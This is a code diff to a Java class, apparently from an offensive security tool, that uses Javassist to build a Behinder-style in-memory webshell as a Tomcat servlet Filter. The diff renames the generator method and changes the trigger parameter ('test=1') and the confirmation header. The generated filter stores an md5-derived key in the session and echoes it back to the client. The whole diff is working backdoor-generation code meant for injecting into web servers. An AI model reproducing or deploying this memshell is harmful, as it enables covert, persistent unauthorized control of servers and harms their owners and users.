@@ -8,8 +8,18 @@ import javax.servlet.Filter;
 
 public class Behinder {
 
-    public static byte[] tomcatEchoPayload(String pass) throws Exception {
+
+    /**
+     * 此处用的是filter马，后面可以换成Listener马更香
+     * Safe6 2021.8.2
+     * @param pass
+     * @return
+     * @throws Exception
+     */
+
+    public static byte[] memBehinder3(String pass) throws Exception {
         //String pass = "rebeyond";
+
         ClassPool classPool = ClassPool.getDefault();
         classPool.insertClassPath(new ClassClassPath(Filter.class));
         classPool.insertClassPath(new ClassClassPath(RequestInfo.class));
@@ -23,7 +33,7 @@ public class Behinder {
         }
         ctClass.setSuperclass(classPool.getCtClass(Filter.class.getName()));
         ctClass.addField(CtField.make("public javax.servlet.jsp.PageContext pageContext;",ctClass));
-        ctClass.addField(CtField.make("public String pass = \"" + pass + "\";", ctClass));
+        ctClass.addField(CtField.make("public String passwd = \"" + pass + "\";", ctClass));
 
 
         ctClass.addConstructor(CtNewConstructor.make("    public MemBehinder3(javax.servlet.jsp.PageContext pageContext){\n" +
@@ -50,10 +60,10 @@ public class Behinder {
                 "        javax.servlet.http.HttpServletResponse response = (javax.servlet.http.HttpServletResponse) servletResponse;\n" +
                 "        javax.servlet.http.HttpSession session = request.getSession();\n" +
                 "\n" +
-                "        response.setHeader(\"Inject\", \"Success\");\n" +
-                "        if (request.getParameter(\"pass\").equals(\"success\")) {\n" +
+                "        response.setHeader(\"inject\", \"ok\");\n" +
+                "        if (request.getParameter(\"test\").equals(\"1\")) {\n" +
                 "//            String k = \"e45e329feb5d925b\";\n" +
-                "            String k = md5(pass);\n" +
+                "            String k = md5(passwd);\n" +
                 "            session.putValue(\"u\", k);\n" +
                 "            // 回显密钥\n" +
                 "            try{\n" +
@@ -123,9 +133,7 @@ public class Behinder {
                 "        }\n" +
                 "        return true;\n" +
                 "    }", ctClass));
-        ctClass.writeFile(".");
-        byte[] bytes = ctClass.toBytecode();
-        return bytes;
+        return ctClass.toBytecode();
     }
 
 }
